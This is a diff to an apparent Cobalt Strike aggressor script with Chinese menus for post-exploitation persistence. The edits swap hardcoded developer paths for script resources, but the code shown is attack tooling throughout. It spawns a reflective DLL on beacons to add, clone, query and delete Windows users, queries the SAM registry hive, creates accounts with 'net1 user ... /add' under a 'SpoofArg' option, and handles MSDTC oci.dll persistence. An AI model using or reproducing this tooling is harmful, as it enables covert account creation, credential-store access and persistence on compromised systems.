@@ -290,7 +290,7 @@ menu "用户操作" {
 						$bid = $3['bid'];
 						$Parameter = "GetGroupUsers"."|1|1|".$3['localgroups']."|1";
 						blog($bid,"$Parameter");
-						bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
+						bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
 					}
 					if($3['addtype'] eq "REG" ){
 						blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
@@ -311,7 +311,7 @@ menu "用户操作" {
 
 						$Parameter = "QueryUserInfo"."|".$User."|1|1|1";
 						blog($bid,"$Parameter");
-						bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
+						bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
 						
 					}
 					if($3['addtype'] eq "REG" ){
@@ -901,7 +901,7 @@ menu "DLL加载"{
 			}
 		}
 
-		# MoveFileEx.dll  D:\ActivePart\Code\VS2019\CobaltStrike_script\Persistence\MSDTC
+		# MoveFileEx.dll  D:\xxx\CobaltStrike_script\Persistence\MSDTC
 		item "清理oci.dll"{
 			local('$bid $ociFile $Data');
 			$ociFile = "C:\\windows\\system32\\oci.dll";
@@ -2050,7 +2050,9 @@ sub AdUser{
 			$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
 		}
 		blog($bid,"$Parameter");
-		bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "AdUser", 5000);	
+		bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "AdUser", 5000);	
+		
+		
 		
 	}else if ($Type eq "SpoofArg"){
 		$cmd1 = "net1 user $User $Pwd /add";
@@ -2080,7 +2082,7 @@ sub CloneUser{
 	$Cuser = $3['cloneuser'];
 	$Parameter = "CloneUser" . "|" . $User . "|" . $Pwd  . "|" .$Cuser."|1";
 	blog($bid,"$Parameter");
-	bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "CloneUser", 5000);	
+	bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "CloneUser", 5000);	
 }
 
 sub DeleteUser{
@@ -2094,7 +2096,7 @@ sub DeleteUser{
 	}else if($Type eq "API"){
 		$Parameter = "DelUser"."|".$User."|1|1|1";
 		blog($bid,"$Parameter");
-		bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "DelUser", 5000);	
+		bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUser", 5000);	
 
 		
 	}	
